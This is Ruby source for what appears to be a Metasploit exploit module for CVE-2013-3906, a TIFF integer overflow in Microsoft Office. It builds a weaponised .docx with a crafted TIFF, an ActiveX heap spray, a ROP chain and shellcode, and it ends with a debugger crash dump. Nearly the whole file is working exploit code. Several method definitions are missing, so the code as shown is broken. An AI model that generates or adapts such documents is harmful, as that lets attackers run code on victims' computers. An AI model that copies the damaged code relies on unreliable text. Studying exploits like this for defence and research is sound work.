require &#039;rex/zip&#039;
require &#039;nokogiri&#039;
 
module ::Nokogiri
module XML
  class Builder
    #
    # Some XML documents don&#039;t declare the namespace before referencing, but Nokogiri requires one.
    # So here&#039;s our hack to get around that by adding a new custom method to the Builder class
    #
    def custom_root(ns)
      e = @parent.create_element(ns)
      e.add_namespace_definition(ns, "href")
      return self
    end
  end
end
end
 
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = AverageRanking
 
  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::RopDb
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Microsoft Tagged Image File Format (TIFF) Integer Overflow",
      &#039;Description&#039;    => %q{
          This module exploits a vulnerability found in Microsoft&#039;s Tagged Image File Format.
          It was originally discovered in the wild, targeting Windows XP and Windows Server 2003
          users running Microsoft Office, specifically in the Middle East and South Asia region.
 
          The flaw is due to a DWORD value extracted from the TIFF file that is embedded as a
          drawing in Microsoft Office, and how it gets calculated with user-controlled inputs,
          and stored in the EAX register. The 32-bit register will run out of storage space to
          dwBytes argumenet (size) for a HeapAlloc call. The HeapAlloc function will allocate a
          chunk anyway with size 0, and the address of this chunk is used as the destination buffer
          of a memcpy function, where the source buffer is the EXIF data (an extended image format
          supported by TIFF), and is also user-controlled. A function pointer in the chunk returned
          by HeapAlloc will end up being overwritten by the memcpy function, and then later used
          in OGL!GdipCreatePath. By successfully controlling this function pointer, and the
          memory layout using ActiveX, it is possible to gain arbitrary code execution under the
          context of the user.
        },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Unknown&#039;, # Some dude wrote it and deployed in the wild, but Haifei Li spotted it
          &#039;sinn3r&#039;   # Metasploit
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2013-3906&#039; ],
          [ &#039;URL&#039;, &#039;http://technet.microsoft.com/en-us/security/advisory/2896666&#039; ],
          [ &#039;URL&#039;, &#039;http://blogs.technet.com/b/srd/archive/2013/11/05/cve-2013-3906-a-graphics-vulnerability-exploited-through-word-documents.aspx&#039; ]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;PrependEncoder&#039; => "\x64\xa1\x18\x00\x00\x00" + # mov eax, fs:[0x18]
                              "\x83\xC0\x08"             + # add eax, byte 8
                              "\x8b\x20"                 + # mov esp, [eax]
                              "\x81\xC4\x30\xF8\xFF\xFF",  # add esp, -2000
          &#039;BadChars&#039;       => "\x00"
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;ExitFunction&#039; => "process",
          &#039;PrependMigrate&#039; => true
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          # XP SP3 + Office 2010 Standard (14.0.6023.1000 32-bit)
          [&#039;Windows XP SP3 with Office Starndard 2010&#039;, {}],
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Nov 5 2013", # Microsoft announcement
      &#039;DefaultTarget&#039;  => 0))
 
      register_options(
        [
          OptString.new(&#039;FILENAME&#039;, [true, &#039;The docx file&#039;, &#039;msf.docx&#039;]),
        ], self.class)
  end
 
  #
  # Creates a TIFF that triggers the overflow
  #
  def make_tiff
    # TIFF Header:
    # TIFF ID                               = &#039;II&#039; (Intel order)
    # TIFF Version                          = 42d
    # Offset of FID                         = 0x000049c8h
    #
    # Image Directory:
    # Number of entries                     = 17d
    # Entry[0]  NewSubFileType              = 0
    # Entry[1]  ImageWidth                  = 256d
    # Entry[2]  ImageHeight                 = 338d
    # Entry[3]  BitsPerSample               = 8 8 8
    # Entry[6]  StripOffsets                = 68 entries (349 bytes)
    # Entry[7]  SamplesPerPixel             = 3
    # Entry[8]  RowsPerStrip                = 5
    # Entry[9]  StripByteCounts             = 68 entries (278 bytes)
    # Entry[10] XResolution                 = 96d
    # Entry[11] YResolution                 = 96d
    # Entry[12] Planar Configuration        = Clunky
    # Entry[13] Resolution Unit             = Inch
    # Entry[14] Predictor                   = None
    # Entry[15] JPEGInterchangeFormatLength = 5252h (1484h)
    # Entry[16] JPEGInterchangeFormat       = 13636d
 
    # Notes:
    # These values are extracted from the file to calculate the HeapAlloc size that result in the overflow:
    # - JPEGInterchangeFormatLength
    # - DWORD at offset 3324h (0xffffb898), no documentation for this
    # - DWORDS after offset 3328h, no documentation for these, either.
    # The DWORD at offset 4874h is what ends up overwriting the function pointer by the memcpy
    # The trigger is really a TIF file, but is named as a JPEG in the docx package
 
    buf = &#039;&#039;
    path = ::File.join(Msf::Config.data_directory, "exploits", "CVE-2013-3906", "word", "media", "image1.jpeg")
    ::File.open(path, "rb") do |f|
      buf = f.read
    end
 
    # Gain control of the call [eax+50h] instruction
    # XCHG EAX, ESP; RETN msvcrt
    buf[0x4874, 4] = [0x200F0700-0x50].pack(&#039;V&#039;)
 
    buf
  end
 
 
  #
  # Generates a payload
  #
  def get_rop_payload
    p = &#039;&#039;
    p << [0x77c15ed5].pack(&#039;V&#039;) # XCHG EAX, ESP  msvcrt
    p << generate_rop_payload(&#039;msvcrt&#039;,&#039;&#039;,{&#039;target&#039;=>&#039;xp&#039;})
    p << payload.encoded
    block  = p
    block << rand_text_alpha(1024 - 80 - p.length)
    block << [ 0x77c34fbf, 0x200f0704 ].pack("V") # pop esp # ret # from msvcrt
    block << rand_text_alpha(1024 - block.length)
 
    buf = &#039;&#039;
    while (buf.length < 0x80000)
      buf << block
    end
 
    buf
  end
 
 
  #
  # Creates an ActiveX bin that will be used as a spray in Office
  #
  def make_activex_bin
    #
    # How an ActiveX bin is referred:
    # document.xml.rels -> ActiveX[num].xml -> activeX[num].xml.rels -> ActiveX[num].bin
    # Every bin is a Microsoft Compound Document File:
    # http://www.openoffice.org/sc/compdocfileformat.pdf
 
    # The bin file
    mscd  = &#039;&#039;
    mscd << [0xe011cfd0].pack(&#039;V&#039;)      # File identifier (first 4 byte)
    mscd << [0xe11ab1a1].pack(&#039;V&#039;)      # File identifier (second 4 byte)
    mscd << [0x00000000].pack(&#039;V&#039;) * 4  # Unique Identifier
    mscd << [0x003e].pack(&#039;v&#039;)          # Revision number
    mscd << [0x0003].pack(&#039;v&#039;)          # Version number
    mscd << [0xfffe].pack(&#039;v&#039;)          # Byte order: Little-Endian
    mscd << [0x0009].pack(&#039;v&#039;)          # Sector size
    mscd << [0x0006].pack(&#039;v&#039;)          # Size of a short-sector
    mscd << "\x00" * 10                 # Not used
    mscd << [0x00000001].pack(&#039;V&#039;)      # Total number of sectors
    mscd << [0x00000001].pack(&#039;V&#039;)      # SecID for the first sector
    mscd << [0x00000000].pack(&#039;V&#039;)      # Not used
    mscd << [0x00001000].pack(&#039;V&#039;)      # Minimum size of a standard stream
    mscd << [0x00000002].pack(&#039;V&#039;)      # Sec ID of first sector
    mscd << [0x00000001].pack(&#039;V&#039;)      # Total number of sectors for the short-sector table
    mscd << [0xfffffffe].pack(&#039;V&#039;)      # SecID of first sector of the mastser sector table
    mscd << [0x00000000].pack(&#039;V&#039;)      # Total number of sectors for master sector talbe
    mscd << [0x00000000].pack(&#039;V&#039;)      # SecIDs
    mscd << [0xffffffff].pack(&#039;V&#039;) * 4 * 59 # SecIDs
    mscd[0x200, 4]  = [0xfffffffd].pack(&#039;V&#039;)
    mscd[0x204, 12] = [0xfffffffe].pack(&#039;V&#039;) * 3
    mscd << Rex::Text.to_unicode("Root Entry")
    mscd << [0x00000000].pack(&#039;V&#039;) * 11
    mscd << "\x05"                      # Type of entry (Root Storage Entry)
    mscd << "\x00"                      # Node colour of the entry (red)
    mscd << [0xffffffff].pack(&#039;V&#039;)      # DirID of the left child node
    mscd << [0xffffffff].pack(&#039;V&#039;)      # DirID of the right child node
    mscd << [0x00000001].pack(&#039;V&#039;)      # DirID of the root node entry
    mscd << [0x1efb6596].pack(&#039;V&#039;)
    mscd << [0x11d1857c].pack(&#039;V&#039;)
    mscd << [0xc0006ab1].pack(&#039;V&#039;)
    mscd << [0x283628f0].pack(&#039;V&#039;)
    mscd << [0x00000000].pack(&#039;V&#039;) * 3
    mscd << [0x287e3070].pack(&#039;V&#039;)
    mscd << [0x01ce2654].pack(&#039;V&#039;)
    mscd << [0x00000003].pack(&#039;V&#039;)
    mscd << [0x00000100].pack(&#039;V&#039;)
    mscd << [0x00000000].pack(&#039;V&#039;)
    mscd << Rex::Text.to_unicode("Contents")
    mscd << [0x00000000].pack(&#039;V&#039;) * 12
    mscd << [0x01020012].pack(&#039;V&#039;)
    mscd << [0xffffffff].pack(&#039;V&#039;) * 3
    mscd << [0x00000000].pack(&#039;V&#039;) * 10
    mscd << [0x000000e4].pack(&#039;V&#039;)
    mscd << [0x00000000].pack(&#039;V&#039;) * 18
    mscd << [0xffffffff].pack(&#039;V&#039;) * 3
    mscd << [0x00000000].pack(&#039;V&#039;) * 29
    mscd << [0xffffffff].pack(&#039;V&#039;) * 3
    mscd << [0x00000000].pack(&#039;V&#039;) * 12
    mscd << [0x00000001].pack(&#039;V&#039;)
    mscd << [0x00000002].pack(&#039;V&#039;)
    mscd << [0x00000003].pack(&#039;V&#039;)
    mscd << [0xfffffffe].pack(&#039;V&#039;)
    mscd << [0xffffffff].pack(&#039;V&#039;) * 32 #52
    mscd << [0x77c34fbf].pack(&#039;V&#039;) # POP ESP # RETN
    mscd << [0x200f0704].pack(&#039;V&#039;) # Final payload target address to begin the ROP
    mscd << [0xffffffff].pack(&#039;V&#039;) * 18
    mscd << @rop_payload
 
    mscd
  end
 
 
  #
  # Creates an activeX[num].xml file
  # @param rid [String] The relationship ID (example: rId1)
  # @return [String] XML document
  #
  def make_activex_xml(rid)
    attrs = {
      &#039;ax:classid&#039;     => "{1EFB6596-857C-11D1-B16A-00C0F0283628}",
      &#039;ax:license&#039;     => "9368265E-85FE-11d1-8BE3-0000F8754DA1",
      &#039;ax:persistence&#039; => "persistStorage",
      &#039;r:id&#039;           => "rId#{rid.to_s}",
      &#039;xmlns:ax&#039;       => "http://schemas.microsoft.com/office/2006/activeX",
      &#039;xmlns:r&#039;        => @schema
    }
    md = ::Nokogiri::XML("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>")
    builder = ::Nokogiri::XML::Builder.with(md) do |xml|
      xml.custom_root("ax")
      xml.ocx(attrs)
    end
 
    builder.to_xml(:indent => 0)
  end
 
 
  #
  # Creates an activeX[num].xml.rels
  # @param relationships [Array] A collection of hashes with each containing:
  #                              :id, :type, :target
  # @return [String] XML document
  #
  def make_activex_xml_reals(rid, target_bin)
    acx_type = "http://schemas.microsoft.com/office/2006/relationships/activeXControlBinary"
    md = ::Nokogiri::XML("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>")
    builder = ::Nokogiri::XML::Builder.with(md) do |xml|
    xml.Relationships(&#039;xmlns&#039;=>"http://schemas.openxmlformats.org/package/2006/relationships") do
        xml.Relationship({:Id=>"rId#{rid.to_s}", :Type=>acx_type, :Target=>target_bin})
    end
    end
 
    builder.to_xml(:indent => 0)
  end
 
  #
  # Creates a document.xml.reals file
  # @param relationships [Array] A collection of hashes with each containing:
  #                              :id, :type, and :target
  # @return [String] XML document
  #
  def make_doc_xml_reals(relationships)
    md = ::Nokogiri::XML("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>")
    builder = ::Nokogiri::XML::Builder.with(md) do |xml|
    xml.Relationships(&#039;xmlns&#039;=>"http://schemas.openxmlformats.org/package/2006/relationships") do
      relationships.each do |r|
        xml.Relationship({:Id=>"rId#{r[:id].to_s}", :Type=>r[:type], :Target=>r[:target]})
      end
    end
    end
 
    builder.to_xml(:indent => 0)
  end
 
 
  #
  # Creates a _rels/.rels file
  #
  def init_rels(doc_xml, doc_props)
    rels = []
    rels << doc_xml
    rels << doc_props
    rels = rels.flatten
 
    md = ::Nokogiri::XML("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>")
    builder = ::Nokogiri::XML::Builder.with(md) do |xml|
    xml.Relationships(&#039;xmlns&#039;=>"http://schemas.openxmlformats.org/package/2006/relationships") do
      rels.each do |r|
        xml.Relationship({:Id=>"rId#{r[:id].to_s}", :Type=>r[:type], :Target=>r[:fname].gsub(/^\//, &#039;&#039;)})
      end
    end
    end
 
    {
      :fname => "_rels/.rels",
      :data  => builder.to_xml(:indent => 0)
    }
  end
 
 
  #
  # Creates a run element for chart
  # @param xml [Element]
  # @param rid [String]
  #
  def create_chart_run_element(xml, rid)
    drawingml_schema = "http://schemas.openxmlformats.org/drawingml/2006"
 
    xml.r do
      xml.rPr do
        xml.noProof
        xml.lang({&#039;w:val&#039; => "en-US"})
      end
 
      xml.drawing do
        xml[&#039;wp&#039;].inline({&#039;distT&#039;=>"0", &#039;distB&#039;=>"0", &#039;distL&#039;=>"0", &#039;distR&#039;=>"0"}) do
          xml[&#039;wp&#039;].extent({&#039;cx&#039;=>&#039;1&#039;, &#039;cy&#039;=>&#039;1&#039;})
          xml[&#039;wp&#039;].effectExtent({&#039;l&#039;=>"1", &#039;t&#039;=>"0", &#039;r&#039;=>"1", &#039;b&#039;=>"0"})
          xml[&#039;wp&#039;].docPr({&#039;id&#039;=>rid.to_s, &#039;name&#039; => "drawing #{rid.to_s}"})
          xml[&#039;wp&#039;].cNvGraphicFramePr
 
          xml[&#039;a&#039;].graphic do
            xml[&#039;a&#039;].graphicData({&#039;uri&#039;=>"#{drawingml_schema}/chart"}) do
              xml[&#039;c&#039;].chart({&#039;r:id&#039;=>"rId#{rid.to_s}"})
            end
          end
        end
      end
    end
  end
 
 
  #
  # Creates a run element for ax
  # @param xml [Element]
  # @param rid [String]
  #
  def create_ax_run_element(xml, rid)
    shape_attrs = {
      &#039;id&#039;    => "_x0000_i10#{rid.to_s}",
      &#039;type&#039;  => "#_x0000_t75",
      &#039;style&#039; => "width:1pt;height:1pt",
      &#039;o:ole&#039; => ""
    }
 
    control_attrs = {
      &#039;r:id&#039;      => "rId#{rid.to_s}",
      &#039;w:name&#039;    => "TabStrip#{rid.to_s}",
      &#039;w:shapeid&#039; =>"_x0000_i10#{rid.to_s}"
    }
 
    xml.r do
      xml.object({&#039;w:dxaOrig&#039;=>"1440", &#039;w:dyaOrig&#039;=>"1440"}) do
        xml[&#039;v&#039;].shape(shape_attrs)
        xml[&#039;w&#039;].control(control_attrs)
      end
    end
  end
 
 
  #
  # Creates a pic run element
  # @param xml [Element]
  # @param rid [String]
  #
  def create_pic_run_element(xml, rid)
    drawinxml_schema = "http://schemas.openxmlformats.org/drawingml/2006"
 
    xml.r do
      xml.rPr do
        xml.noProof
        xml.lang({&#039;w:val&#039;=>"en-US"})
      end
 
      xml.drawing do
        xml[&#039;wp&#039;].inline({&#039;distT&#039;=>"0", &#039;distB&#039;=>"0", &#039;distL&#039;=>"0", &#039;distR&#039;=>"0"}) do
          xml.extent({&#039;cx&#039;=>&#039;1&#039;, &#039;cy&#039;=>&#039;1&#039;})
          xml[&#039;wp&#039;].effectExtent({&#039;l&#039;=>"1", &#039;t&#039;=>"0", &#039;r&#039;=>"0", &#039;b&#039;=>"0"})
          xml[&#039;wp&#039;].docPr({&#039;id&#039;=>rid.to_s, &#039;name&#039;=>"image", &#039;descr&#039;=>"image.jpeg"})
          xml[&#039;wp&#039;].cNvGraphicFramePr do
            xml[&#039;a&#039;].graphicFrameLocks({&#039;xmlns:a&#039;=>"#{drawinxml_schema}/main", &#039;noChangeAspect&#039;=>"1"})
          end
 
          xml[&#039;a&#039;].graphic({&#039;xmlns:a&#039;=>"#{drawinxml_schema}/main"}) do
            xml[&#039;a&#039;].graphicData({&#039;uri&#039;=>"#{drawinxml_schema}/picture"}) do
              xml[&#039;pic&#039;].pic({&#039;xmlns:pic&#039;=>"#{drawinxml_schema}/picture"}) do
                xml[&#039;pic&#039;].nvPicPr do
                  xml[&#039;pic&#039;].cNvPr({&#039;id&#039;=>rid.to_s, &#039;name&#039;=>"image.jpeg"})
                  xml[&#039;pic&#039;].cNvPicPr
                end
 
                xml[&#039;pic&#039;].blipFill do
                  xml[&#039;a&#039;].blip(&#039;r:embed&#039;=>"rId#{rid.to_s}", &#039;cstate&#039;=>"print")
                  xml[&#039;a&#039;].stretch do
                    xml[&#039;a&#039;].fillRect
                  end
                end
 
                xml[&#039;pic&#039;].spPr do
                  xml[&#039;a&#039;].xfrm do
                    xml[&#039;a&#039;].off({&#039;x&#039;=>"0", &#039;y&#039;=>"0"})
                    xml[&#039;a&#039;].ext({&#039;cx&#039;=>"1", &#039;cy&#039;=>"1"})
                  end
 
                  xml[&#039;a&#039;].prstGeom({&#039;prst&#039; => "rect"}) do
                    xml[&#039;a&#039;].avLst
                  end
                end
              end
            end
          end
        end
      end
    end
  end
 
 
  #
  # Creates a document.xml file
  # @param activex [Array]
  # @param tiff_file [Array]
  # @return [String] XML document
  #
    chart_rids = []
 
    # Get all the ActiveX RIDs
    ax_rids = []
    activex.select { |e| ax_rids << e[:id] }
 
    # Get the TIFF RID
    tiff_rid = tiff_file[:id]
 
    # Documentation on how this is crafted:
    # http://msdn.microsoft.com/en-us/library/office/gg278308.aspx
    doc_attrs = {
      &#039;xmlns:ve&#039;  => "http://schemas.openxmlformats.org/markup-compatibility/2006",
      &#039;xmlns:o&#039;   => "urn:schemas-microsoft-com:office:office",
      &#039;xmlns:r&#039;   => @schema,
      &#039;xmlns:m&#039;   => "http://schemas.openxmlformats.org/officeDocument/2006/math",
      &#039;xmlns:v&#039;   => "urn:schemas-microsoft-com:vml",
      &#039;xmlns:wp&#039;  => "http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing",
      &#039;xmlns:w10&#039; => "urn:schemas-microsoft-com:office:word",
      &#039;xmlns:w&#039;   => "http://schemas.openxmlformats.org/wordprocessingml/2006/main",
      &#039;xmlns:wne&#039; => "http://schemas.microsoft.com/office/word/2006/wordml",
      &#039;xmlns:a&#039;   => "http://schemas.openxmlformats.org/drawingml/2006/main",
      &#039;xmlns:c&#039;   => "http://schemas.openxmlformats.org/drawingml/2006/chart"
    }
 
    p_attrs_1 = {&#039;w:rsidR&#039; => "00F8254F", &#039;w:rsidRDefault&#039; => "00D15BD0" }
    p_attrs_2 = {&#039;w:rsidR&#039; => "00D15BD0", &#039;w:rsidRPr&#039; =>"00D15BD0", &#039;w:rsidRDefault&#039; => "00D15BD0" }
 
    md = ::Nokogiri::XML("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>")
    builder = ::Nokogiri::XML::Builder.with(md) do |xml|
      xml.custom_root("w")
 
      xml.document(doc_attrs) do
        xml.body do
          # Paragraph (ActiveX)
          xml.p(p_attrs_1) do
            # Paragraph properties
            xml.pPr do
              # Run properties
              xml.rPr do
                xml.lang({&#039;w:val&#039; => "en-US"})
              end
            end
 
            ax_rids.each do |rid|
              create_ax_run_element(xml, rid)
            end
          end
 
          xml.p(p_attrs_2) do
            xml.pPr do
              xml.rPr do
                xml[&#039;w&#039;].lang({&#039;w:val&#039;=>"en-US"})
              end
            end
 
            # Charts
            chart_rids.each do |rid|
              create_chart_run_element(xml, rid)
            end
 
            # TIFF
            create_pic_run_element(xml, tiff_rid)
          end
        end
      end
    end
 
    {
      :id           => (last_rid + 1).to_s,
      :type         => "#{@schema}/officeDocument",
      :fname        => "/word/document.xml",
      :content_type => "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml",
      :xml          => builder.to_xml(:indent => 0)
    }
  end
 
  #
  # Creates a [Content.Types].xml file located in the parent directory
  # @param overrides [Array] A collection of hashes with each containing
  #                          the :PartName and :ContentType info
  # @return [String] XML document
  #
  def make_contenttype_xml(overrides)
    contenttypes = [
      {
        :Extension   => "rels",
        :ContentType => "application/vnd.openxmlformats-package.relationships+xml"
      },
      {
        :Extension   => "xml",
        :ContentType => "application/xml"
      },
      {
        :Extension   => "jpeg",
        :ContentType => "image/jpeg"
      },
      {
        :Extension   => "bin",
        :ContentType => "application/vnd.ms-office.activeX"
      },
      {
        :Extension  => "xlsx",
      }
    ]
 
    md = ::Nokogiri::XML("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>")
    builder = ::Nokogiri::XML::Builder.with(md) do |xml|
    xml.Types({&#039;xmlns&#039;=>"http://schemas.openxmlformats.org/package/2006/content-types"}) do
      # Default extensions
      contenttypes.each do |contenttype|
        xml.Default(contenttype)
      end
 
      # Additional overrides
      overrides.each do |override|
        override_attrs = {
          :PartName    => override[:PartName] || override[:fname],
          :ContentType => override[:ContentType]
        }
        xml.Override(override_attrs)
      end
    end
    end
 
    builder.to_xml(:indent => 0)
  end
 
 
  #
  # Pre-define some items that will be used in .rels
  #
  def init_doc_props(last_rid)
    items = []
    items << {
      :id           => (last_rid += 1),
      :type         => "#{@schema}/extended-properties",
      :fname        => "/docProps/app.xml",
      :content_type => "application/vnd.openxmlformats-officedocument.extended-properties+xml"
    }
 
    items << {
      :id           => (last_rid += 1),
      :type         => "http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties",
      :fname        => "/docProps/core.xml",
      :content_type => "application/vnd.openxmlformats-package.core-properties+xml"
    }
 
    return last_rid, items
  end
 
 
  #
  # Pre-define some items that will be used in document.xml.rels
  #
  def init_doc_xml_rels_items(last_rid)
    items = []
    items << {
      :id           => (last_rid += 1),
      :type         => "#{@schema}/styles",
      :fname        => "/word/styles.xml",
      :content_type => "application/vnd.openxmlformats-officedocument.wordprocessingml.styles+xml"
    }
 
    items << {
      :id           => (last_rid += 1),
      :type         => "#{@schema}/settings",
      :fname        => "/word/settings.xml",
      :content_type => "application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"
    }
 
    items << {
      :id           => (last_rid += 1),
      :type         => "#{@schema}/webSettings",
      :fname        => "/word/webSettings.xml",
      :content_type => "application/vnd.openxmlformats-officedocument.wordprocessingml.webSettings+xml"
    }
 
    items << {
      :id           => (last_rid += 1),
      :type         => "#{@schema}/fontTable",
      :fname        => "/word/fontTable.xml",
      :content_type => "application/vnd.openxmlformats-officedocument.wordprocessingml.fontTable+xml"
    }
 
    items << {
      :id           => (last_rid += 1),
      :type         => "#{@schema}/theme",
      :fname        => "/word/theme/theme1.xml",
      :content_type => "application/vnd.openxmlformats-officedocument.theme+xml"
    }
 
    items << {
      :id           => (last_rid += 1),
      :type         => "#{@schema}/chart",
      :fname        => "/word/charts/chart1.xml",
      :content_type => "application/vnd.openxmlformats-officedocument.drawingml.chart+xml"
    }
 
    items << {
      :id           => (last_rid += 1),
      :type         => "#{@schema}/chart",
      :fname        => "/word/charts/chart2.xml",
      :content_type => "application/vnd.openxmlformats-officedocument.drawingml.chart+xml"
    }
 
    items << {
      :id           => (last_rid += 1),
      :type         => "#{@schema}/chart",
      :fname        => "/word/charts/chart3.xml",
      :content_type => "application/vnd.openxmlformats-officedocument.drawingml.chart+xml"
    }
 
    items << {
      :id           => (last_rid += 1),
      :type         => "#{@schema}/chart",
      :fname        => "/word/charts/chart4.xml",
      :content_type => "application/vnd.openxmlformats-officedocument.drawingml.chart+xml"
    }
 
    items << {
      :id           => (last_rid += 1),
      :type         => "#{@schema}/chart",
      :fname        => "/word/charts/chart5.xml",
      :content_type => "application/vnd.openxmlformats-officedocument.drawingml.chart+xml"
    }
 
    items << {
      :id           => (last_rid += 1),
      :type         => "#{@schema}/chart",
      :fname        => "/word/charts/chart6.xml",
      :content_type => "application/vnd.openxmlformats-officedocument.drawingml.chart+xml"
    }
 
    return last_rid, items
  end
 
 
  #
  # Manually create everything manually in the ActiveX directory
  #
  def init_activex_files(last_rid)
    activex = []
 
    0x250.times do |i|
      id = (last_rid += 1)
 
      bin  = {
        :fname => "/word/activeX/activeX#{id.to_s}.bin",
        :bin => make_activex_bin
      }
 
      xml  = {
        :fname => "/word/activeX/activeX#{id.to_s}.xml",
        :xml => make_activex_xml(id)
      }
 
      rels = {
        :fname => "/word/activeX/_rels/activeX#{id.to_s}.xml.rels",
        :rels => make_activex_xml_reals(id, "activeX#{id.to_s}.bin")
      }
 
      ct   = "application/vnd.ms-office.activeX+xml"
      type = "#{@schema}/control"
 
      activex << {
        :id           => id,
        :bin          => bin,
        :xml          => xml,
        :rels         => rels,
        :content_type => ct,
        :type         => type
      }
    end
 
    return last_rid, activex
  end
 
 
  #
  # Create a [Content_Types.xml], each node contains these attributes:
  # :PartName     The path to an ActiveX XML file
  # :ContentType  The contenttype of the XML file
  #
  def init_contenttype_xml_file(*items)
    overrides = []
    items.each do |item|
      item.each do |obj|
        overrides << {:PartName => obj[:fname] || obj[:xml][:fname], :ContentType => obj[:content_type]}
      end
    end
 
    {:fname => "[Content_Types].xml", :data => make_contenttype_xml(overrides)}
  end
 
 
  #
  # Creates the tiff file
  #
  def init_tiff_file(last_rid)
    id = last_rid + 1
    tiff_data = {
      :id   => id,
      :fname => "/word/media/image1.jpeg",
      :data  => make_tiff,
      :type  => "#{@schema}/image"
    }
 
    return id, tiff_data
  end
 
  #
  # Create the document.xml.rels file
  #
    reals = []
      reals << {:id => obj[:id], :type => obj[:type], :target => obj[:fname].gsub(/^\/word\//, &#039;&#039;)}
    end
 
    activex.each do |obj|
      reals << {:id => obj[:id], :type => obj[:type], :target => obj[:xml][:fname].gsub(/^\/word\//, &#039;&#039;)}
    end
 
    reals << {:id => tiff[:id], :type => tiff[:type], :target => tiff[:fname].gsub(/^\/word\//, &#039;&#039;)}
 
    {:fname => "/word/_rels/document.xml.rels", :data => make_doc_xml_reals(reals)}
  end
 
  #
  # Loads a fiile
  #
  def read_file(fname)
    buf = &#039;&#039;
    ::File.open(fname, "rb") do |f|
      buf << f.read
    end
 
    buf
  end
 
 
  #
  # Packages everything to docx
  #
  def make_docx(path)
    print_status("Initializing files...")
    last_rid = 0
    last_rid, doc_xml_rels_items = init_doc_xml_rels_items(last_rid)
    last_rid, activex            = init_activex_files(last_rid)
    last_rid, doc_props          = init_doc_props(last_rid)
    last_rid, tiff_file          = init_tiff_file(last_rid)
    doc_xml                      = init_doc_xml(last_rid, doc_xml_rels_items, activex, tiff_file)
    ct_xml_file                  = init_contenttype_xml_file(activex, doc_xml_rels_items, doc_props, [doc_xml])
    doc_xml_reals_file           = init_doc_xml_reals_file(doc_xml_rels_items, activex, tiff_file)
    rels_xml                     = init_rels(doc_xml, doc_props)
 
    zip = Rex::Zip::Archive.new
    Dir["#{path}/**/**"].each do |file|
      p = file.sub(path+&#039;/&#039;,&#039;&#039;)
 
      if File.directory?(file)
        print_status("Packing directory: #{p}")
        zip.add_file(p)
      else
        # Avoid packing image1.jpeg because we&#039;ll load it separately
        if file !~ /media\/image1\.jpeg/
          print_status("Packing file: #{p}")
          zip.add_file(p, read_file(file))
        end
      end
    end
 
    print_status("Packing ActiveX controls...")
    activex.each do |ax|
      ax_bin  = ax[:bin]
      ax_xml  = ax[:xml]
      ax_rels = ax[:rels]
 
      vprint_status("Packing file: #{ax_bin[:fname]}")
      zip.add_file(ax_bin[:fname], ax_bin[:bin])
 
      vprint_status("Packing file: #{ax_xml[:fname]}")
      zip.add_file(ax_xml[:fname], ax_xml[:xml])
 
      vprint_status("Packing file: #{ax_rels[:fname]}")
      zip.add_file(ax_rels[:fname], ax_rels[:rels])
    end
 
    print_status("Packing file: #{ct_xml_file[:fname]}")
    zip.add_file(ct_xml_file[:fname], ct_xml_file[:data])
 
    print_status("Packing file: #{tiff_file[:fname]}")
    zip.add_file(tiff_file[:fname], tiff_file[:data])
 
    print_status("Packing file: #{doc_xml[:fname]}")
    zip.add_file(doc_xml[:fname], doc_xml[:xml])
 
    print_status("Packing file: #{rels_xml[:fname]}")
    zip.add_file(rels_xml[:fname], rels_xml[:data])
 
    print_status("Packing file: #{doc_xml_reals_file[:fname]}")
    zip.add_file(doc_xml_reals_file[:fname], doc_xml_reals_file[:data])
 
    zip.pack
  end
 
  def exploit
    @rop_payload = get_rop_payload
    @schema = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
    path = File.join(Msf::Config.data_directory, "exploits", "CVE-2013-3906")
    docx = make_docx(path)
    file_create(docx)
  end
 
end
 
=begin
 
0:000> r
eax=414242f4 ebx=00000000 ecx=22a962a0 edx=44191398 esi=22c4d338 edi=1cfe5dc0
eip=44023a2a esp=0011fd8c ebp=0011fd98 iopl=0         nv up ei ng nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010286
OGL!GdipCreatePath+0x58:
44023a2a ff5050          call    dword ptr [eax+50h]  ds:0023:41424344=????????
0:000> k
ChildEBP RetAddr  
WARNING: Stack unwind information not available. Following frames may be wrong.
0011fd98 437a9681 OGL!GdipCreatePath+0x58
0011fdc8 437b11b0 gfx+0x9681
0011fdf0 422b56e5 gfx+0x111b0
0011fe18 422a99f7 oart!Ordinal3584+0x86
0011fed8 422a9921 oart!Ordinal7649+0x2b2
0011fef0 422a8676 oart!Ordinal7649+0x1dc
001200bc 422a85a8 oart!Ordinal4145+0x199
001200fc 424898c6 oart!Ordinal4145+0xcb
001201bc 42489b56 oart!Ordinal3146+0xb15
001202cc 422a37df oart!Ordinal3146+0xda5
00120330 422a2a73 oart!Ordinal2862+0x14e
00120360 317821a9 oart!Ordinal2458+0x5e
001203bc 31782110 wwlib!GetAllocCounters+0x9bd51
001204a4 3177d1f2 wwlib!GetAllocCounters+0x9bcb8
001207ec 3177caef wwlib!GetAllocCounters+0x96d9a
0012088c 3177c7a0 wwlib!GetAllocCounters+0x96697
001209b0 3175ab83 wwlib!GetAllocCounters+0x96348
001209d4 317569e0 wwlib!GetAllocCounters+0x7472b
00120ad4 317540f5 wwlib!GetAllocCounters+0x70588
00120afc 3175400b wwlib!GetAllocCounters+0x6dc9d
 
  To-do:
  Turn the docx packaging into a mixin. Good luck with that. 
   
=end

